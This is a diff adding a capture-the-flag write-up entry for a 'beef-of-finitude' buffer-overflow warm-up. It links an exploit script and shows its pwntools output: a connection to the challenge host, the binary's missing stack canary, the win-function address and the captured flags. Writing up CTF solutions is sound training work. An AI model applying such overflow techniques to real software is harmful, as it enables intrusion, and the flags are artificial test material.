@@ -352,3 +352,27 @@ def guess(str):
 Full code: [guessinggame_sol.py](guessing-game/guessinggame_sol.py)
 
 Flag: `UDCTF{c4n_y0u_gu355_7h15_f14g?}`
+
+---
+# beef-of-finitude (pwn warm-up - 100 pts)
+
+Basic buffer overflow. See [bof_pwn.py](beef-of-finitude/bof_pwn.py)
+
+```
+$ python3 bof_pwn.py
+[+] Opening connection to challenges.ctfd.io on port 30027: Done
+[*] '/home/kali/ctf/2021/_other/bof.out'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] win base addr: 0x8049236
+[*] Switching to interactive mode
+
+Wow you overflowed the right value! Now try to find the flag !
+
+flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}
+
+[*] Got EOF while reading in interactive
+```
